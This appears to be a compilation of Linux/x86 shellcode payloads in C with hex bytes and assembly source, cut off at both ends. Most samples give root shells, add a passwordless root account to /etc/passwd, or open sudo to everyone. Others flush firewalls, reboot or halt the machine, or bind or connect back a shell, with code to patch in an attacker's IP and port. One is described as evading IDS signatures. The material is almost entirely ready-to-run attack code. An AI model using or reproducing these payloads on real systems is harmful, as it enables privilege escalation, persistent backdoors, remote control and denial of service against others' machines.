    for (t = shellcode; *t; t++)
        if (islower(*t))
            *t = toupper(*t);
	
    ret=(int *)&ret +3;
    printf("Shellcode lenght=%d\n",strlen(shellcode));
    (*ret) = (int)shellcode;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
By Thomas Rinsma < me[at]th0mas.nl > (16 apr. 2008)

Shellcode makes system speaker beep once, 45 bytes:


   ;     int fd = open("/dev/tty10", O_RDONLY);
   push byte 5
   pop eax
   cdq
   push edx
   push 0x30317974
   push 0x742f2f2f
   push 0x7665642f
   mov ebx, esp
   mov ecx, edx
   int 80h

   ;     ioctl(fd, KDMKTONE (19248), 66729180);
   mov ebx, eax
   push byte 54
   pop eax
   mov ecx, 4294948047
   not ecx
   mov edx, 66729180
   int 80h
*/


main()
{
   char shellcode[] =
       "\x6a\x05\x58\x99\x52\x68\x74\x79\x31\x30\x68\x2f\x2f\x2f\x74"
       "\x68\x2f\x64\x65\x76\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x6a\x36"
       "\x58\xb9\xcf\xb4\xff\xff\xf7\xd1\xba\xdc\x34\xfa\x03\xcd\x80";

   (*(void (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x6a\x17"		// push	$0x17
	"\x58"			// pop	%eax
	"\x31\xdb"		// xor	%ebx,%ebx
	"\xcd\x80"		// int	$0x80

	"\xb0\x2e"		// mov	$0x2e,%al
	"\xcd\x80"		// int	$0x80

	"\xb0\x0b"		// mov	$0xb,%al (So you'll get segfault if it's not able to
do the setuid(0). If you don't want this you can write "\x6a\x0b\x58"
instead of "\xb0\x0b", but the shellcode will be 1 byte longer
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
	"\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 setuid(0), setgid(0) &
execve(/bin/sh,[/bin/sh,NULL])"
		"\n[+] Date: 23/06/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x6a\x17"		// push	$0x17
	"\x58"			// pop	%eax
	"\x31\xdb"		// xor	%ebx,%ebx
	"\xcd\x80"		// int	$0x80

	"\xb0\x0b"		// mov	$0xb,%al (So you'll get segfault   if it's not able
to do the setuid(0). If you don't want this you can write "\x6a\x0b\x58"
instead of "\xb0\x0b", but the shellcode will be 1 byte longer
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
	"\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
	"\x89\xe3"		// mov	%esp,%ebx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 setuid(0) & execve(/bin/sh,0)"
		"\n[+] Date: 23/06/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x40"			// inc	%eax
//	"\x43"			// inc	%ebx	
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Yet conditional (%eax==0) Linux/x86 exit(0) 3 bytes or
exit(1) 4 bytes"
		"\n[+] Date: 18/06/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x64\x6f\x77\x6e"	// push	$0x6e776f64
	"\x68\x73\x68\x75\x74"	// push	$0x74756873
	"\x68\x69\x6e\x2f\x2f"	// push	$0x2f2f6e69
	"\x68\x2f\x2f\x73\x62"	// push	$0x62732f2f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x6a\x30"		// push	$0x30
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/shutdown,/sbin/shutdown 0)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x68\x62\x6f\x6f\x74"	// push	$0x746f6f62
	"\x68\x6e\x2f\x72\x65"	// push	$0x65722f6e
	"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/reboot,/sbin/reboot)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

const char shellcode[]=
	"\x6a\x0b"		// push	$0xb
	"\x58"			// pop	%eax
	"\x99"			// cltd
	"\x52"			// push	%edx
	"\x66\x68\x6c\x74"	// pushw $0x746c
	"\x68\x6e\x2f\x68\x61"	// push	$0x61682f6e
	"\x68\x2f\x73\x62\x69"	// push	$0x6962732f
	"\x89\xe3"		// mov	%esp,%ebx
	"\x52"			// push	%edx
	"\x53"			// push	%ebx
	"\x89\xe1"		// mov	%esp,%ecx
	"\xcd\x80";		// int	$0x80

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/halt,/sbin/halt)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
		"\n\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode)-1);
	(*(void (*)()) shellcode)();
	return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>

/* 
__asm__("

sub     $0x4,%esp   ## Con esto conseguimos que la shellcode nunca se
popl    %esp        ## sobreescriba... gracias RaiSe :)

xorl    %edx,%edx   ## %edx a cero
pushl   %edx        ## y ponemos los zeros del final del string en memoria
pushw   $0x462d     ## tenemos -F0000

movl    %esp,%esi   ## wardamos argv[1] en %esi

pushl   %edx        ## 0000-F0000

pushl   $0x736e6961
pushl   $0x68637069 ## ipchains0000-F0000

movl    %esp,%edi   ## wardamos argv[0] en %edi

pushl   $0x2f6e6962
pushl   $0x732f2f2f ## ///sbin/ipchains0000-F0000

movl    %esp,%ebx   ## en %ebx, el nombre de archivo

pushl   %edx        ## 0000///sbin/ipchains0000-F0000
pushl   %esi        ## A[1]0000///sbin/ipchains0000-F0000
pushl   %edi        ## A[0]A[1]0000///sbin/ipchains0000-F0000

movl    %esp,%ecx   ## %ecx apunta a el inicio del argv[]

xorl    %eax,%eax
movb    $0xb,%al
int     $0x80

");
*/

char c0de[]=
"\x83\xec\x04\x5c\x31\xd2\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x61\x69\x6e\x73"
"\x68\x69\x70\x63\x68\x89\xe7\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3"
"\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";


/* execve("///sbin/ipchains",ARGV,NULL);
 * ARGV[] = {"ipchains","-F",NULL}
 */

int main(void)
{
	long *toRET;
	char vuln[52];

	*(&toRET+2) = (long *)c0de;

	strcpy(vuln, c0de);

	printf("Shellc0de length: %d\nRunning.......\n\n", strlen(c0de));
	return(0);
}

/* Sp4rK <sp4rk@netsearch-ezine.com>
 * UNDERSEC Security TEAM
 * NetSearch E-zine
 */





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

  jmp call_w00w00

w00w00:
  popl %edi
  jmp w0w0w

call_w00w00:

  call w00w00

w0w0w:

 # OPEN
 # ecx=flag (O_RDONLY, O_WRONLY, ...) 
 #     O_WRONLY | O_APPEND | O_CREAT = 0x441
 # edx=file mode
 # ebx=address of filename
 # eax=0x05 syscall number

  xorl %ebx,%ebx
  movb $(file-w0w0w),%bl
  addl %edi,%ebx

  xorb %al,%al
  movb %al,11(%ebx)

  xorl %ecx,%ecx
  movw $0x441,%cx

  xorl %edx,%edx
  movw $00644,%dx

  xorl %eax,%eax
  movb $0x5,%al

  int $0x80
  movl %eax,%ebx    # save file descriptor to %ebx (for write)
 
#  WRITE
#  ecx=address of buffer to write
#  edx=number of bytes to write
#  ebx=file descriptor
#  eax=0x04
  
  xorl %ecx,%ecx
  movb $(string-w0w0w),%cl
  addl %edi,%ecx

  xorl %edx,%edx
  movb $31,%dl

  xorl %eax,%eax
  movb $0x04,%al

  int $0x80                                           
  
  xorl %eax,%eax
  movb $1,%al
  int $0x80
  
file:  
.ascii "/etc/passwd"
endfile:
.byte 1 
string:
.ascii "w00w00::0:0:w0w0w!:/:/bin/sh\n"

*/

/* 
 * Source to this is pass.s
 * This will append a root line to the passwd file (see the source).
 *
 * Shok (Matt Conover), shok@dataforce.net
 */

char shellcode[]=
  "\xeb\x03\x5f\xeb\x05\xe8\xf8\xff\xff\xff\x31\xdb\xb3\x35\x01\xfb"
  "\x30\xc0\x88\x43\x0b\x31\xc9\x66\xb9\x41\x04\x31\xd2\x66\xba\xa4"
  "\x01\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc9\xb1\x41\x01\xf9\x31"
  "\xd2\xb2\x1f\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x2f"
  "\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x01\x77\x30\x30\x77\x30"
  "\x30\x3a\x3a\x30\x3a\x30\x3a\x77\x30\x77\x30\x77\x21\x3a\x2f\x3a"
  "\x2f\x62\x69\x6e\x2f\x73\x68\x0a";

void main()
{

  int *ret;
  
  printf("w00w00!\n");
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 *	Author: Sh3llc0d3
 *	Environment: Linux/x86
 *	Developed from: GNU ASM (AT&T Syntax)
 *	Purpose: [setreuid()] -> [/sbin/iptables -F] -> [exit(0)]
 *	Size: 76 bytes
 *
 *	Website:	root-exploit.com
 */
char code[] =	"\xeb\x33\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x5e\x31\xc0\x88\x46"
		"\x0e\x88\x46\x11\x89\x76\x12\x8d\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0"
		"\x0b\x89\xf3\x8d\x4e\x12\x8d\x56\x1a\xcd\x80\x31\xc0\xb0\x01\x31\xdb"
		"\xcd\x80\xe8\xc8\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61"
		"\x62\x6c\x65\x73\x23\x2d\x46\x23";

int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*---------------------------------------------------------------------------*
 *                372 byte socket-proxy shellcode                            *
 *              by Russell Sanford - xort@tty64.org                          *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-bounce-proxy.c                                     *
 *        date: 12/23/2005                                                   *
 *        info: Compiled with DTP Project.                                   *
 * discription: This is a x86-linux proxy shellcode. This is probably best   *
 * 	        used in stage 2 situations. The syntax for invoking the      *
 * 	        patchcode is as follows:                                     *
 *                                                                           *
 * 		patchcode(shellcode,31337,"11.22.33.44",80);                 *
 *                                                                           *
 * 		Where 31337 is the port to listen to on the remote host      *
 *---------------------------------------------------------------------------*/

char shellcode[] =
"\xe8\xff\xff\xff\xff\xc6\x4e\x5e\x81\xc6\x18\xfc\xff\xff\xeb\x48\x89\xc3\x6a\x03\x59\xb0\xdd\xcd"
"\x80\x56\x89\xde\x80\xcc\x08\x6a\x04\x59\xb0\xdd\xcd\x80\x93\x5e\xc3\x89\xc2\x83\xe0\x1f\xc1\xea"
"\x05\x8d\x8e\x78\xff\xff\xff\x0f\xab\x04\x91\xc3\x93\xb0\x03\x8d\x8e\x48\xf4\xff\xff\x66\xba\x01"
"\x08\xcd\x80\xc3\x93\xb0\x04\x8d\x8e\x48\xf4\xff\xff\xcd\x80\xc3\x8d\xbe\xf8\xfe\xff\xff\x31\xc0"
"\x31\xc9\x66\xb9\x01\x01\xf3\xaa\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b"
"\x5a\x68\x7e\xff\xfe\xff\x81\x04\x24\x01\x01\x01\x01\x68 xor\x81\x04\x24t@tt\x6a\x10\x51\x50\x89"
"\xe1\xb0\x66\xcd\x80\xb3\x04\xb0\x66\xcd\x80\x5a\x50\x50\x52\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89"
"\x46\xfc\xe8\x5b\xff\xff\xff\xe8\x6f\xff\xff\xff\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0"
"\x66\xcd\x80\x5b\x43\x5f\x68y64.\x81\x04\x24org \x68need\x81\x04\x24 job\x6a\x10\x51\x50\x89\xe1"
"\xb0\x66\xcd\x80\x58\x89\x46\xf8\xe8\x19\xff\xff\xff\xe8\x2d\xff\xff\xff\x8b\x5e\xfc\x8b\x4e\xf8"
"\x6a\x01\x53\x51\x6a\x02\x51\x53\x39\xd9\x7e\x02\x89\xcb\x56\x43\x8d\x8e\x78\xff\xff\xff\x31\xd2"
"\x31\xf6\x31\xff\xb0\x8e\xcd\x80\x5e\x58\x50\x89\xc2\x83\xe0\x1f\xc1\xea\x05\x8d\x8e\x78\xff\xff"
"\xff\x0f\xa3\x04\x91\x73\x04\x59\x59\xeb\x32\x58\x50\xe8\xe5\xfe\xff\xff\x58\x31\xff\x47\x83\x7c"
"\x24\x04\x02\x74\x02\xf7\xdf\x01\xf8\xe8\xe4\xfe\xff\xff\x39\xc0\x89\xc2\x58\x31\xff\x47\x83\x3c"
"\x24\x02\x75\x02\xf7\xdf\x01\xf8\xe8\xdd\xfe\xff\xff\x59\xe2\xb1\xeb\x88";

int find_safe_offset(int INT_A) {

	int INT_B=0;
	
	do {
		INT_A -= 0x01010101;	INT_B += 0x01010101;
	}
	while ( ((INT_A & 0x000000ff) == 0) || 
		((INT_A & 0x0000ff00) == 0) || 
		((INT_A & 0x00ff0000) == 0) ||
		((INT_A & 0xff000000) == 0) );

	return INT_B;
}

void patchcode(char *shellcode, int PORT_IN, char *IP, int PORT_OUT) {
	
	int PORT_IN_A = ((ntohs(PORT_IN) << 16) + 2);
	int PORT_IN_B = find_safe_offset(PORT_IN_A);	

	int IP_A = inet_addr(IP);
	int IP_B = find_safe_offset(IP_A);

	int PORT_OUT_A = ((ntohs(PORT_OUT) << 16) + 2);
	int PORT_OUT_B = find_safe_offset(PORT_OUT_A);	

	*(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);
	*(int *)&shellcode[141] = PORT_IN_B;

	*(int *)&shellcode[205] = (IP_A - IP_B);
	*(int *)&shellcode[212] = IP_B;
	
	*(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);
	*(int *)&shellcode[224] = PORT_OUT_B;

}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*---------------------------------------------------------------------------*
 *                 90 byte Connect Back shellcode                            *
 *              by Russell Sanford - xort@tty64.org                          *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-connect-back.c                                     *
 *        info: Compiled with DTP Project.                                   *
 * discription: This is a x86-linux connect back shellcode. Just invoke      *
 * 		the function patchcode() before using shellcode. The format  *
 * 		for invoking patchcode is as follows:                        *
 *                                                                           *
 * 		patchcode(shellcode,"11.22.33.44",31337);                    *
 *---------------------------------------------------------------------------*/

char shellcode[] =
"\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x43\x5f\x68"
" xor\x81\x04\x24t@tt\x68y64.\x81\x04\x24org \x6a\x10\x51\x50\x89\xe1\xb0\x66"
"\xcd\x80\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x31\xc0\x50"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80\xeb\xfe";

int find_safe_offset(int INT_A) {

	int INT_B=0;
	
	do {
		INT_A -= 0x01010101;	INT_B += 0x01010101;
	}
	while ( ((INT_A & 0x000000ff) == 0) || 
		((INT_A & 0x0000ff00) == 0) || 
		((INT_A & 0x00ff0000) == 0) ||
		((INT_A & 0xff000000) == 0) );

	return INT_B;
}

void patchcode(char *shellcode, char *IP, int PORT) {
	
	int IP_A = inet_addr(IP);
	int IP_B = find_safe_offset(IP_A);

	int PORT_A = ((ntohs(PORT) << 16) + 2);
	int PORT_B = find_safe_offset(PORT_A);	

	*(int *)&shellcode[19] = (IP_A - IP_B);
	*(int *)&shellcode[26] = IP_B;

	*(int *)&shellcode[31] = (PORT_A - PORT_B);
	*(int *)&shellcode[38] = PORT_B;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Author: Rick
Email: rick2600@hotmail.com

OS: Linux/x86
Description: Anyone can run sudo without password

section .text
	global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax
	push eax
	push 0x7372656f 
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	mov cx, 0x401
	mov al, 0x05
	int 0x80

	mov ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax
	push eax
	push 0x0a4c4c41
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
	mov dl, 0x1c
	mov al, 0x04
	int 0x80

	;close(file)
	mov al, 0x06
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01
	int 0x80

*/

#include "stdio.h"
#include "string.h"

char code[] =
"\x31\xc0\x50\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64"
"\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xb0\x05"
"\xcd\x80\x89\xc3\x31\xc0\x50\x68\x41\x4c\x4c\x0a\x68"
"\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e"
"\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41"
"\x4c\x4c\x20\x89\xe1\xb2\x1c\xb0\x04\xcd\x80\xb0\x06"
"\xcd\x80\x31\xdb\xb0\x01\xcd\x80";

void main(void) {
	
	void (*shellcode)() = code;
	shellcode();
	
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
       Author: Rick
       Email: rick2600@hotmail.com

       OS: Linux/x86
       Description: Port Bind 4444 ( xor-encoded )


--------------------------------------------------------------------
section .text
    global _start

_start:

    ;socket (PF_INET, SOCK_STREAM, 0)
    push byte 0x66      
    pop eax
    push byte 0x01
    pop ebx
    xor ecx, ecx
    push ecx
    push byte 0x01
    push byte 0x02
    mov ecx, esp
    int 0x80
    
    mov esi, eax	;save file descriptor
    
    ;bind (sockfd, server, len)
    xor edx, edx
    push edx
    push word 0x5c11
    push word 0x02
    mov ecx, esp
    push byte 0x10
    push ecx
    push eax
    mov ecx, esp
    mov bl, 0x02
    push byte 0x66
    pop eax
    int 0x80
    
    ;listen
    mov al, 0x66
    mov bl, 0x04
    int 0x80
    
    ;accept
    push edx
    push esi 
    mov ecx, esp
    inc ebx
    push byte 0x66
    pop eax
    int 0x80
    
    mov ebx, eax	;save file descriptor
    
    ;dup2(sockfd, 2); dup2(sockfd, 1); dup2(sockfd, 0)
    push byte 0x02
    pop ecx
    do_dup:
        push byte 0x3f
        pop eax
        int 0x80
    loop do_dup
        push byte 0x3f
        pop eax
        int 0x80
    
    
    ; execve ("/bin/sh", ["/bin/sh", "-i"], 0);
    xor edx, edx
    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    push edx
    push word 0x692d
    mov ecx, esp
    push edx
    push ecx
    push ebx
    mov ecx, esp
    push byte 0x0b
    pop eax
    int 0x80
    
    ;exit(0)
    push byte 0x01
    pop eax
    xor ebx, ebx
    int 0x80
--------------------------------------------------------------------
*/
                        
#include <stdio.h>
#include <string.h>



char code[] =
"\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34"
"\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05"
"\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f"
"\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff"
"\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f"
"\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f"
"\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e"
"\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff"
"\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c"
"\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21"
"\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d"
"\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78"
"\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff"
"\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5"
"\xd3\x9e";



int main(void)
{
   printf("length: %d\n", strlen(code));
   
   void (*shellcode)();
   shellcode = (void *)code;
   shellcode();
   return (0);
    
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * revenge-setuid.c, v1.0 2006/09/30 14:57
 *
 * linux/x86 setuid(0) + execve("/bin//sh", ["/bin//sh"], NULL) shellcode
 * once again...
 *
 * [    setuid (6 bytes) + execve (22 bytes)  = 28 bytes       ]
 * [                                                           ]
 * [    Same as revenge-execve.c we start the 2 system         ]
 * [    calls with a mov resulting in 2 bytes less, but        ]
 * [    this one is only for suid binary exploitation.         ]
 * [                                                           ]
 *
 * http://www.0xcafebabe.it
 * <revenge@0xcafebabe.it>
 *
 */

char sc[] =
                                     // <_start>
       "\xb0\x17"                    // mov    $0x17,%al
       "\x31\xdb"                    // xor    %ebx,%ebx
       "\xcd\x80"                    // int    $0x80
       "\xb0\x0b"                    // mov    $0xb,%al
       "\x99"                        // cltd
       "\x52"                        // push   %edx
       "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
       "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
       "\x89\xe3"                    // mov    %esp,%ebx
       "\x52"                        // push   %edx
       "\x53"                        // push   %ebx
       "\x89\xe1"                    // mov    %esp,%ecx
       "\xcd\x80"                    // int    $0x80
;

int main()
{
       void    (*fp)(void) = (void (*)(void))sc;

       printf("Length: %d\n",strlen(sc));
       fp();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * revenge-execve.c, v1.0 2006/10/14 16:32
 *
 * Yet another linux execve shellcode..
 * linux/x86 execve("/bin//sh/",["/bin//sh"],NULL) shellcode
 *
 * http://www.0xcafebabe.it
 * < revenge@0xcafebabe.it >
 *
 * But this time it's 22 bytes
 *
 * [ We could start the shellcode with a mov instead of (push + pop) eax  ]
 * [ obtaining the same result with 1 byte less, but if we had something  ]
 * [ wrong in eax (ex. -1 due to an unclear function exit) we can't       ]
 * [ inject it                                                            ]
 *
 * */

char sc[] =
                                     // <_start>
       "\xb0\x0b"                    // mov    $0xb,%al
       "\x99"                        // cltd
       "\x52"                        // push   %edx
       "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
       "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
       "\x89\xe3"                    // mov    %esp,%ebx
       "\x52"                        // push   %edx
       "\x53"                        // push   %ebx
       "\x89\xe1"                    // mov    %esp,%ecx
       "\xcd\x80"                    // int    $0x80
;

int main()
{
       void    (*fp)(void) = (void (*)(void))sc;

       printf("Length: %d\n",strlen(sc));
       fp();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 *  Linux/x86
 *
 *  /bin/cp /bin/sh /tmp/katy ; chmod 4555 /tmp/sh using fork()
 */
#include "stdio.h"


char shellcode[] =
"\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
"\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
"\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
"\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
"\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
"\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
"\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/katy";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}

/* Code */
/*
__asm__("
        jmp    0x5e
        popl   %edi
        xorl   %eax,%eax
        movb   %al,0x7(%edi)
        movb   %al,0xf(%edi)
        movb   %al,0x19(%edi)
        movl   %edi,0x1a(%edi)
        leal   0x8(%edi),%esi
        movl   %esi,0x1e(%edi)
        xorl   %esi,%esi
        leal   0x10(%edi),%esi
        movl   %esi,0x22(%edi)
        movl   %eax,0x26(%edi)
        movl   %edi,%ebx
        leal   0x1a(%edi),%ecx
        leal   0x26(%edi),%edx
        xorl   %eax,%eax
        movb   $0x2,%al
        int    $0x80
        xorl   %esi,%esi
        cmpl   %eax,%esi
        jne    0x6
        movb   $0xb,%al
        int    $0x80
        jmp    0x1d
        xorl   %edx,%edx
        xorl   %eax,%eax
        xorl   %ebx,%ebx
        dec    %ebx
        leal   0x26(%edi),%ecx
        movb   $0x7,%al
        int    $0x80
        xorl   %eax,%eax
        leal   0x10(%edi),%ebx
        xorl   %ecx,%ecx
        movw   $0x96d,%cx
        movb   $0xf,%al
        int    $0x80
        xorl   %eax,%eax
        inc    %eax
        xorl   %ebx,%ebx
        int    $0x80
        call   -0x63
        .ascii \"/bin/cp8/bin/sh8/tmp/katy\"
");
*/

/*
RaiSe < raise@undersec.com >
http://www.undersec.com
*/





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
[N] Shell : shellcodez

Arch:x86
Platform:linux
Size:40
Description:
The shellcode to execute /bin/sh;
This shellcode is anti-ids
It not containz encoding engine but it
not contain standart signatures as:
	"\xcd\x80"
	'\bin\sh'
Tested on Slackware 10.0

Coded by [NicatiN]
http://nshell.h15.ru
n_shell@mail.ru


source:
cdq
push edx
pop eax
push edx
mov edi,876189623
add edi,edi
push edi
mov edi,884021143
add edi,edi
inc edi
push edi
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,99
sub al,88
sub edi,1768009314
push edi
call esp

dizasm:
8048080:       99                      cltd
8048081:       52                      push   %edx
8048082:       58                      pop    %eax
8048083:       52                      push   %edx
8048084:       bf b7 97 39 34          mov    $0x343997b7,%edi
8048089:       01 ff                   add    %edi,%edi
804808b:       57                      push   %edi
804808c:       bf 97 17 b1 34          mov    $0x34b11797,%edi
8048091:       01 ff                   add    %edi,%edi
8048093:       47                      inc    %edi
8048094:       57                      push   %edi
8048095:       89 e3                   mov    %esp,%ebx
8048097:       52                      push   %edx
8048098:       53                      push   %ebx
8048099:       89 e1                   mov    %esp,%ecx
804809b:       b0 63                   mov    $0x63,%al
804809d:       2c 58                   sub    $0x58,%al
804809f:       81 ef 62 ae 61 69       sub    $0x6961ae62,%edi
80480a5:       57                      push   %edi
80480a6:       ff d4                   call   *%esp

*/

char sc[]=
"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1"
"\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81"
"\xef\x62\xae\x61\x69\x57\xff\xd4";

int main()
{
